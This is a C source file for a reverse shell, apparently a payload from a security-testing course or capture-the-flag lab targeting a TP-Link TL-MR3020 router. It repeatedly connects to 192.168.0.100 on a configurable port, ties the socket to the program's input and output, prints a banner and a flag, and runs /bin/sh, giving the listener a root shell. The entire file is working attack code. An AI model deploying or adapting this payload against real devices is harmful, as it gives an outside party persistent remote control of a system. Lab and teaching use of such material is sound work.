#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>

#define REMOTE_ADDR "192.168.0.100"
int REMOTE_PORT = 10001;

void exec_shell(int sock_fd) {
    // Redirect IO
    char str_buff1[128];
    char str_buff2[128];
    dup2(sock_fd, 0);
    dup2(sock_fd, 1);
    dup2(sock_fd, 2);
    sprintf(str_buff1, "## FLAG: flag{AST_2025_%d}                                                ##\n", REMOTE_PORT);
    sprintf(str_buff2, "## on Port %d to Server at 192.168.0.100                                  ##\n", REMOTE_PORT);
    write(sock_fd,"###############################################################################\n",80);
    write(sock_fd,"##               Advanced Security Testing Root Shell                        ##\n",80);
    write(sock_fd,"###############################################################################\n",80);
    write(sock_fd,"## Access to root shell on TPLINK TL-MR3020                                  ##\n",80);
    write(sock_fd,str_buff2,80);
    write(sock_fd,str_buff1,80);
    write(sock_fd,"###############################################################################\n",80);
    write(sock_fd,"\n",1);
    write(sock_fd,"# ",2);
    // Execute shell
    execl("/bin/sh", "sh", NULL);
}

int main(int argc, char* argv[]) {
  pid_t mypid;
  int fd;
  int ret = -1;

while(1)
{
    if(ret == -1) //no valid connection to socket server jet.
    {
      fd = socket(AF_INET, SOCK_STREAM, 0);
      struct sockaddr_in sa_dst;
      memset(&sa_dst, 0, sizeof(struct sockaddr_in));
      sa_dst.sin_family = AF_INET;
      if(argc==2){
          REMOTE_PORT = atoi(argv[1]);
      }
      sa_dst.sin_port = htons(REMOTE_PORT);
      sa_dst.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
      ret = connect(fd, (struct sockaddr *)&sa_dst, sizeof(struct sockaddr));
      printf("trying to connect to port: %i ret=%i\n", REMOTE_PORT, ret);
      sleep(1);
    }
    else if(ret == 0) // connection ok
    {
       printf("connection ok!\n");
         mypid = fork();
         if(mypid == 0) //child process
         {
           exec_shell(fd);
         }
         else{ //parent waits until child finished.
           int returnStatus;
           waitpid(mypid,&returnStatus, 0);
           printf("child has returned: %i\n", returnStatus);
           ret = -1;
           close(fd);
         }

       }
       else{

         printf("error\n");
       }
}

    return EXIT_SUCCESS;
}
